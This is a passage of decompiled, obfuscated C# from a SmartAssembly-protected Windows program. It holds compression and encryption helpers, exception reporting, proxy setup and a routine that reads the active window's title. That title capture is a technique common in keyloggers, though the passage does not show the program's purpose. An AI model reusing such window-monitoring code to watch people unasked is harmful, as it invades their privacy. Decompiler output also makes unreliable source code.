				Class32.smethod_70(41777787, stream);
				byte[] array3 = Class32.smethod_134(1, (byte[])null, (byte[])null, iv);
				using (Class19 decrypt = new Class19())
				{
					using ICryptoTransform cryptoTransform2 = Class32.smethod_60(key: false, key, decrypt, version);
					byte[] array4 = cryptoTransform2.TransformFinalBlock(array3, 0, array3.Length);
					stream.Write(array4, 0, array4.Length);
				}
				break;
			}
			case 3:
			{
				Class32.smethod_70(58555003, stream);
				byte[] array = Class32.smethod_134(1, (byte[])null, (byte[])null, iv);
				using (Class18 iv2 = new Class18())
				{
					using ICryptoTransform cryptoTransform = Class32.smethod_119(key, iv2, decrypt: false, version);
					byte[] array2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
					stream.Write(array2, 0, array2.Length);
				}
				break;
			}
			}
			stream.Flush();
			stream.Close();
			return stream.ToArray();
		}
		catch (Exception ex)
		{
			Class20.string_0 = "ERR 2003: " + ex.Message;
			throw;
		}
	}

	unsafe static void smethod_135(Class20.Class27.Class28 class28_0)
	{
		void* ptr = stackalloc byte[16];
		int[] array = new int[class28_0.int_3];
		*(int*)ptr = 0;
		class28_0.short_1 = new short[class28_0.short_0.Length];
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < class28_0.int_3)
		{
			array[*(int*)((byte*)ptr + 4)] = *(int*)ptr;
			*(int*)ptr += class28_0.int_2[*(int*)((byte*)ptr + 4)] << 15 - *(int*)((byte*)ptr + 4);
			(*(int*)((byte*)ptr + 4))++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < class28_0.int_1)
		{
			*(int*)((byte*)ptr + 12) = class28_0.byte_0[*(int*)((byte*)ptr + 8)];
			if (*(int*)((byte*)ptr + 12) > 0)
			{
				class28_0.short_1[*(int*)((byte*)ptr + 8)] = Class32.smethod_40(array[*(int*)((byte*)ptr + 12) - 1]);
				int[] array2;
				int[] array3 = (array2 = array);
				int num = *(int*)((byte*)ptr + 12) - 1;
				nint num2 = num;
				array3[num] = array2[num2] + (1 << 16 - *(int*)((byte*)ptr + 12));
			}
			(*(int*)((byte*)ptr + 8))++;
		}
	}

	static void smethod_136(Exception exception, object o1, object o2, object o3, object o4, object o5, object o6, object o7, object o8, object o9, object o10)
	{
		Class32.smethod_28(exception, new object[10] { o1, o2, o3, o4, o5, o6, o7, o8, o9, o10 });
	}

	static void smethod_137(string name, string fileName, Class35 class35_0)
	{
		if (File.Exists(name))
		{
			Class35.Struct17 value = new Class35.Struct17(name);
			class35_0.dictionary_1.Add(fileName, value);
		}
	}

	unsafe static int smethod_138(Class20.Class27 len, int int_0)
	{
		void* ptr = stackalloc byte[8];
		if (int_0 == 255)
		{
			*(int*)((byte*)ptr + 4) = 285;
		}
		else
		{
			*(int*)ptr = 257;
			while (int_0 >= 8)
			{
				*(int*)ptr += 4;
				int_0 >>= 1;
			}
			*(int*)((byte*)ptr + 4) = *(int*)ptr + int_0;
		}
		return *(int*)((byte*)ptr + 4);
	}

	static void smethod_139(Class20.Class29 class29_0)
	{
		class29_0.int_10 = (class29_0.byte_0[class29_0.int_14] << 5) ^ class29_0.byte_0[class29_0.int_14 + 1];
	}

	unsafe static bool smethod_140(int dist, int len, Class20.Class27 class27_0)
	{
		void* ptr = stackalloc byte[9];
		class27_0.short_0[class27_0.int_9] = (short)dist;
		class27_0.byte_1[class27_0.int_9++] = (byte)(len - 3);
		*(int*)ptr = Class32.smethod_138(class27_0, len - 3);
		short[] short_;
		short[] array = (short_ = class27_0.class28_0.short_0);
		int num = *(int*)ptr;
		nint num2 = num;
		array[num] = (short)(short_[num2] + 1);
		if (*(int*)ptr >= 265 && *(int*)ptr < 285)
		{
			class27_0.int_10 += (*(int*)ptr - 261) / 4;
		}
		*(int*)((byte*)ptr + 4) = Class32.smethod_37(class27_0, dist - 1);
		short[] array2 = (short_ = class27_0.class28_1.short_0);
		int num3 = *(int*)((byte*)ptr + 4);
		num2 = num3;
		array2[num3] = (short)(short_[num2] + 1);
		if (*(int*)((byte*)ptr + 4) >= 4)
		{
			class27_0.int_10 += *(int*)((byte*)ptr + 4) / 2 - 1;
		}
		((byte*)ptr)[8] = (Class32.smethod_20(class27_0) ? ((byte)1) : ((byte)0));
		return ((byte*)ptr)[8] != 0;
	}

	unsafe static void smethod_141(byte[] codeLengths, Class20.Class24 class24_0)
	{
		void* ptr = stackalloc byte[68];
		int[] array = new int[16];
		int[] array2 = new int[16];
		*(int*)ptr = 0;
		while (*(int*)ptr < codeLengths.Length)
		{
			*(int*)((byte*)ptr + 4) = codeLengths[*(int*)ptr];
			if (*(int*)((byte*)ptr + 4) > 0)
			{
				int[] array3;
				int[] array4 = (array3 = array);
				int num = *(int*)((byte*)ptr + 4);
				nint num2 = num;
				array4[num] = array3[num2] + 1;
			}
			(*(int*)ptr)++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		*(int*)((byte*)ptr + 12) = 512;
		*(int*)((byte*)ptr + 16) = 1;
		while (*(int*)((byte*)ptr + 16) <= 15)
		{
			array2[*(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 8);
			*(int*)((byte*)ptr + 8) += array[*(int*)((byte*)ptr + 16)] << 16 - *(int*)((byte*)ptr + 16);
			if (*(int*)((byte*)ptr + 16) >= 10)
			{
				*(int*)((byte*)ptr + 20) = array2[*(int*)((byte*)ptr + 16)] & 0x1FF80;
				*(int*)((byte*)ptr + 24) = *(int*)((byte*)ptr + 8) & 0x1FF80;
				*(int*)((byte*)ptr + 12) += *(int*)((byte*)ptr + 24) - *(int*)((byte*)ptr + 20) >> 16 - *(int*)((byte*)ptr + 16);
			}
			(*(int*)((byte*)ptr + 16))++;
		}
		class24_0.short_0 = new short[*(int*)((byte*)ptr + 12)];
		*(int*)((byte*)ptr + 28) = 512;
		*(int*)((byte*)ptr + 32) = 15;
		while (*(int*)((byte*)ptr + 32) >= 10)
		{
			*(int*)((byte*)ptr + 36) = *(int*)((byte*)ptr + 8) & 0x1FF80;
			*(int*)((byte*)ptr + 8) -= array[*(int*)((byte*)ptr + 32)] << 16 - *(int*)((byte*)ptr + 32);
			*(int*)((byte*)ptr + 40) = *(int*)((byte*)ptr + 8) & 0x1FF80;
			*(int*)((byte*)ptr + 44) = *(int*)((byte*)ptr + 40);
			while (*(int*)((byte*)ptr + 44) < *(int*)((byte*)ptr + 36))
			{
				class24_0.short_0[Class32.smethod_40(*(int*)((byte*)ptr + 44))] = (short)((-(*(int*)((byte*)ptr + 28)) << 4) | *(int*)((byte*)ptr + 32));
				*(int*)((byte*)ptr + 28) += 1 << *(int*)((byte*)ptr + 32) - 9;
				*(int*)((byte*)ptr + 44) += 128;
			}
			(*(int*)((byte*)ptr + 32))--;
		}
		*(int*)((byte*)ptr + 48) = 0;
		while (*(int*)((byte*)ptr + 48) < codeLengths.Length)
		{
			*(int*)((byte*)ptr + 52) = codeLengths[*(int*)((byte*)ptr + 48)];
			if (*(int*)((byte*)ptr + 52) != 0)
			{
				*(int*)((byte*)ptr + 8) = array2[*(int*)((byte*)ptr + 52)];
				*(int*)((byte*)ptr + 56) = Class32.smethod_40(*(int*)((byte*)ptr + 8));
				if (*(int*)((byte*)ptr + 52) <= 9)
				{
					do
					{
						class24_0.short_0[*(int*)((byte*)ptr + 56)] = (short)((*(int*)((byte*)ptr + 48) << 4) | *(int*)((byte*)ptr + 52));
						*(int*)((byte*)ptr + 56) += 1 << *(int*)((byte*)ptr + 52);
					}
					while (*(int*)((byte*)ptr + 56) < 512);
				}
				else
				{
					*(int*)((byte*)ptr + 60) = class24_0.short_0[*(int*)((byte*)ptr + 56) & 0x1FF];
					*(int*)((byte*)ptr + 64) = 1 << (*(int*)((byte*)ptr + 60) & 0xF);
					*(int*)((byte*)ptr + 60) = -(*(int*)((byte*)ptr + 60) >> 4);
					do
					{
						class24_0.short_0[*(int*)((byte*)ptr + 60) | (*(int*)((byte*)ptr + 56) >> 9)] = (short)((*(int*)((byte*)ptr + 48) << 4) | *(int*)((byte*)ptr + 52));
						*(int*)((byte*)ptr + 56) += 1 << *(int*)((byte*)ptr + 52);
					}
					while (*(int*)((byte*)ptr + 56) < *(int*)((byte*)ptr + 64));
				}
				array2[*(int*)((byte*)ptr + 52)] = *(int*)((byte*)ptr + 8) + (1 << 16 - *(int*)((byte*)ptr + 52));
			}
			(*(int*)((byte*)ptr + 48))++;
		}
	}

	static void smethod_142(Exception exception, object o1)
	{
		Class32.smethod_28(exception, new object[1] { o1 });
	}

	unsafe static bool smethod_143(Class20.Class29 curMatch, int int_0)
	{
		void* ptr = stackalloc byte[23];
		int num = 128;
		*(int*)ptr = 128;
		short[] short_ = curMatch.short_1;
		int int_ = curMatch.int_14;
		*(int*)((byte*)ptr + 4) = curMatch.int_14 + curMatch.int_12;
		*(int*)((byte*)ptr + 8) = Math.Max(curMatch.int_12, 2);
		*(int*)((byte*)ptr + 12) = Math.Max(curMatch.int_14 - 32506, 0);
		*(int*)((byte*)ptr + 16) = curMatch.int_14 + 258 - 1;
		((byte*)ptr)[20] = curMatch.byte_0[*(int*)((byte*)ptr + 4) - 1];
		((byte*)ptr)[21] = curMatch.byte_0[*(int*)((byte*)ptr + 4)];
		if (*(int*)((byte*)ptr + 8) >= 8)
		{
			num >>= 2;
		}
		if (*(int*)ptr > curMatch.int_15)
		{
			*(int*)ptr = curMatch.int_15;
		}
		do
		{
			if (curMatch.byte_0[int_0 + *(int*)((byte*)ptr + 8)] != ((byte*)ptr)[21] || curMatch.byte_0[int_0 + *(int*)((byte*)ptr + 8) - 1] != ((byte*)ptr)[20] || curMatch.byte_0[int_0] != curMatch.byte_0[int_] || curMatch.byte_0[int_0 + 1] != curMatch.byte_0[int_ + 1])
			{
				continue;
			}
			int num2 = int_0 + 2;
			int_ += 2;
			while (curMatch.byte_0[++int_] == curMatch.byte_0[++num2] && curMatch.byte_0[++int_] == curMatch.byte_0[++num2] && curMatch.byte_0[++int_] == curMatch.byte_0[++num2] && curMatch.byte_0[++int_] == curMatch.byte_0[++num2] && curMatch.byte_0[++int_] == curMatch.byte_0[++num2] && curMatch.byte_0[++int_] == curMatch.byte_0[++num2] && curMatch.byte_0[++int_] == curMatch.byte_0[++num2] && curMatch.byte_0[++int_] == curMatch.byte_0[++num2] && int_ < *(int*)((byte*)ptr + 16))
			{
			}
			if (int_ > *(int*)((byte*)ptr + 4))
			{
				curMatch.int_11 = int_0;
				*(int*)((byte*)ptr + 4) = int_;
				*(int*)((byte*)ptr + 8) = int_ - curMatch.int_14;
				if (*(int*)((byte*)ptr + 8) >= *(int*)ptr)
				{
					break;
				}
				((byte*)ptr)[20] = curMatch.byte_0[*(int*)((byte*)ptr + 4) - 1];
				((byte*)ptr)[21] = curMatch.byte_0[*(int*)((byte*)ptr + 4)];
			}
			int_ = curMatch.int_14;
		}
		while ((int_0 = short_[int_0 & 0x7FFF] & 0xFFFF) > *(int*)((byte*)ptr + 12) && --num != 0);
		curMatch.int_12 = Math.Min(*(int*)((byte*)ptr + 8), curMatch.int_15);
		((byte*)ptr)[22] = ((curMatch.int_12 >= 3) ? ((byte)1) : ((byte)0));
		return ((byte*)ptr)[22] != 0;
	}

	static void smethod_144(Class20.Class30 class30_0)
	{
		if (class30_0.int_2 > 0)
		{
			class30_0.byte_0[class30_0.int_1++] = (byte)class30_0.uint_0;
			if (class30_0.int_2 > 8)
			{
				class30_0.byte_0[class30_0.int_1++] = (byte)(class30_0.uint_0 >> 8);
			}
		}
		class30_0.uint_0 = 0u;
		class30_0.int_2 = 0;
	}

	static void smethod_145(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_1 = false;
	}

	static void smethod_146(Control0 sender, object e, EventArgs eventArgs_0)
	{
		sender.bool_1 = !sender.bool_1;
		((Control)sender).Refresh();
	}

	static void smethod_147(Class34 proxy, IWebProxy iwebProxy_0)
	{
		proxy.iwebProxy_0 = iwebProxy_0;
	}

	static void smethod_148(EventArgs1 eventArgs1_0)
	{
		if (eventArgs1_0.bool_0)
		{
			Class32.smethod_67(eventArgs1_0.class35_0);
		}
	}

	static void smethod_149(Exception exception, object o1, object o2, object o3, object o4, object o5)
	{
		Class32.smethod_28(exception, new object[5] { o1, o2, o3, o4, o5 });
	}

	static string smethod_150(Form1 form1_0)
	{
		string lpString = new string('\0', 100);
		Class32.GetWindowTextA(Class32.GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	static void smethod_151(string name, EventArgs1 fileName, string string_0)
	{
		Class32.smethod_137(name, string_0, fileName.class35_0);
	}

	unsafe static int smethod_152(Class20.Class23 input, Class20.Class22 len, int int_0)
	{
		void* ptr = stackalloc byte[12];
		int_0 = Math.Min(Math.Min(int_0, 32768 - input.int_3), len.AvailableBytes);
		*(int*)((byte*)ptr + 4) = 32768 - input.int_2;
		if (int_0 > *(int*)((byte*)ptr + 4))
		{
			*(int*)ptr = Class32.smethod_13(len, input.byte_0, input.int_2, *(int*)((byte*)ptr + 4));
			if (*(int*)ptr == *(int*)((byte*)ptr + 4))
			{
				*(int*)ptr += Class32.smethod_13(len, input.byte_0, 0, int_0 - *(int*)((byte*)ptr + 4));
			}
		}
		else
		{
			*(int*)ptr = Class32.smethod_13(len, input.byte_0, input.int_2, int_0);
		}
		input.int_2 = (input.int_2 + *(int*)ptr) & 0x7FFF;
		input.int_3 += *(int*)ptr;
		*(int*)((byte*)ptr + 8) = *(int*)ptr;
		return *(int*)((byte*)ptr + 8);
	}

	static void smethod_153(Control2 sender, object e, EventArgs eventArgs_0)
	{
		try
		{
			Process.Start("http://www.red-gate.com/products/dotnet-development/smartassembly/?utm_source=smartassemblyui&utm_medium=supportlink&utm_content=aerdialogbox&utm_campaign=smartassembly");
		}
		catch
		{
		}
	}

	static void smethod_154(Class44 sender, object e, ThreadExceptionEventArgs threadExceptionEventArgs_0)
	{
		try
		{
			Exception ex = threadExceptionEventArgs_0.Exception;
			Type type = ex.GetType();
			if (type.Name == "UnhandledException" && type.Namespace == "SmartAssembly.SmartExceptionsCore")
			{
				ex = (Exception)type.GetField("PreviousException")!.GetValue(ex);
			}
			if (!(ex is SecurityException) || !(Class44.string_2 == "1") || !sender.method_0(ex as SecurityException))
			{
				sender.method_1(ex, canContinue: true, manuallyReported: false);
			}
		}
		catch
		{
		}
	}

	static void smethod_155(Class18 class18_0)
	{
		class18_0.type_0.GetMethod("Clear")!.Invoke(class18_0.object_0, new object[0]);
	}

	static byte[] smethod_156(byte[] buffer, byte[] key, byte[] iv)
	{
		return Class32.smethod_134(2, buffer, key, iv);
	}

	static void smethod_157(int value, Class20.Stream0 stream0_0)
	{
		stream0_0.WriteByte((byte)((uint)value & 0xFFu));
		stream0_0.WriteByte((byte)((uint)(value >> 8) & 0xFFu));
	}

	unsafe static void smethod_158(int[] childs, Class20.Class27.Class28 class28_0)
	{
		void* ptr = stackalloc byte[36];
		class28_0.byte_0 = new byte[class28_0.short_0.Length];
		*(int*)ptr = childs.Length / 2;
		*(int*)((byte*)ptr + 4) = (*(int*)ptr + 1) / 2;
		*(int*)((byte*)ptr + 8) = 0;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < class28_0.int_3)
		{
			class28_0.int_2[*(int*)((byte*)ptr + 12)] = 0;
			(*(int*)((byte*)ptr + 12))++;
		}
		int[] array = new int[*(int*)ptr];
		array[*(int*)ptr - 1] = 0;
		*(int*)((byte*)ptr + 16) = *(int*)ptr - 1;
		int[] int_;
		nint num2;
		while (*(int*)((byte*)ptr + 16) >= 0)
		{
			if (childs[2 * *(int*)((byte*)ptr + 16) + 1] != -1)
			{
				*(int*)((byte*)ptr + 20) = array[*(int*)((byte*)ptr + 16)] + 1;
				if (*(int*)((byte*)ptr + 20) > class28_0.int_3)
				{
					*(int*)((byte*)ptr + 20) = class28_0.int_3;
					(*(int*)((byte*)ptr + 8))++;
				}
				array[childs[2 * *(int*)((byte*)ptr + 16)]] = (array[childs[2 * *(int*)((byte*)ptr + 16) + 1]] = *(int*)((byte*)ptr + 20));
			}
			else
			{
				*(int*)((byte*)ptr + 24) = array[*(int*)((byte*)ptr + 16)];
				int[] array2 = (int_ = class28_0.int_2);
				int num = *(int*)((byte*)ptr + 24) - 1;
				num2 = num;
				array2[num] = int_[num2] + 1;
				class28_0.byte_0[childs[2 * *(int*)((byte*)ptr + 16)]] = (byte)array[*(int*)((byte*)ptr + 16)];
			}
			(*(int*)((byte*)ptr + 16))--;
		}
		if (*(int*)((byte*)ptr + 8) == 0)
		{
			return;
		}
		int num3 = class28_0.int_3 - 1;
		while (true)
		{
			if (class28_0.int_2[--num3] != 0)
			{
				do
				{
					int[] array3 = (int_ = class28_0.int_2);
					int num4 = num3;
					num2 = num4;
					array3[num4] = int_[num2] - 1;
					int[] array4 = (int_ = class28_0.int_2);
					int num5 = ++num3;
					num2 = num5;
					array4[num5] = int_[num2] + 1;
					*(int*)((byte*)ptr + 8) -= 1 << class28_0.int_3 - 1 - num3;
				}
				while (*(int*)((byte*)ptr + 8) > 0 && num3 < class28_0.int_3 - 1);
				if (*(int*)((byte*)ptr + 8) <= 0)
				{
					break;
				}
			}
		}
		int[] array5 = (int_ = class28_0.int_2);
		int num6 = class28_0.int_3 - 1;
		num2 = num6;
		array5[num6] = int_[num2] + *(int*)((byte*)ptr + 8);
		int[] array6 = (int_ = class28_0.int_2);
		int num7 = class28_0.int_3 - 2;
		num2 = num7;
		array6[num7] = int_[num2] - *(int*)((byte*)ptr + 8);
		int num8 = 2 * *(int*)((byte*)ptr + 4);
		*(int*)((byte*)ptr + 28) = class28_0.int_3;
		while (*(int*)((byte*)ptr + 28) != 0)
		{
			*(int*)((byte*)ptr + 32) = class28_0.int_2[*(int*)((byte*)ptr + 28) - 1];
			while (*(int*)((byte*)ptr + 32) > 0)
			{
				int num9 = 2 * childs[num8++];
				if (childs[num9 + 1] == -1)
				{
					class28_0.byte_0[childs[num9]] = (byte)(*(uint*)((byte*)ptr + 28));
					(*(int*)((byte*)ptr + 32))--;
				}
			}
			(*(int*)((byte*)ptr + 28))--;
		}
	}

	static void smethod_159(string errorMessage, Control0 control0_0)
	{
		control0_0.string_0 = errorMessage;
		control0_0.timer_0.set_Enabled(false);
		control0_0.image_0 = (Image)(object)Class32.smethod_24((errorMessage.Length > 0) ? "error" : "ok");
		control0_0.bool_1 = true;
		control0_0.bool_0 = true;
		if (errorMessage.Length > 0)
		{
			((Control)control0_0).set_Height(100);
		}
		((Control)control0_0).Refresh();
	}

	static void smethod_160(Class44 sender, object e, UnhandledExceptionEventArgs unhandledExceptionEventArgs_0)
	{
		try
		{
			if ((!(unhandledExceptionEventArgs_0.ExceptionObject is SecurityException) || !(Class44.string_2 == "1") || !sender.method_0(unhandledExceptionEventArgs_0.ExceptionObject as SecurityException)) && unhandledExceptionEventArgs_0.ExceptionObject is Exception)
			{
				sender.method_1((Exception)unhandledExceptionEventArgs_0.ExceptionObject, !unhandledExceptionEventArgs_0.IsTerminating, manuallyReported: false);
			}
		}
		catch
		{
		}
	}
}
